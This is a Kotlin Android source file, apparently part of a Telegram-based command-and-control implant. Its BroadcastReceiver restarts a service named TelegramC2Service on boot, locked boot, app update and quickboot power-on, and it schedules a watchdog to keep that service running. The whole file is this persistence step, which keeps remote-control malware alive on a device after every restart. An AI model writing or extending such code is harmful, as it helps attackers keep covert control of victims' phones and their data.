package com.outcome.c2

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(ctx: Context, intent: Intent) {
        val action = intent.action ?: return
        Log.i("BootReceiver", "received $action")
        LogBus.append(ctx.applicationContext, "BOOT", action)

        when (action) {
            Intent.ACTION_BOOT_COMPLETED,
            Intent.ACTION_LOCKED_BOOT_COMPLETED,
            Intent.ACTION_MY_PACKAGE_REPLACED,
            "android.intent.action.QUICKBOOT_POWERON" -> {
                try {
                    val svc = Intent(ctx, TelegramC2Service::class.java)
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        ctx.startForegroundService(svc)
                    } else {
                        ctx.startService(svc)
                    }
                } catch (e: Exception) {
                    Log.w("BootReceiver", "start failed: ${e.message}")
                }

                WatchdogReceiver.schedule(ctx)
            }
        }
    }
}
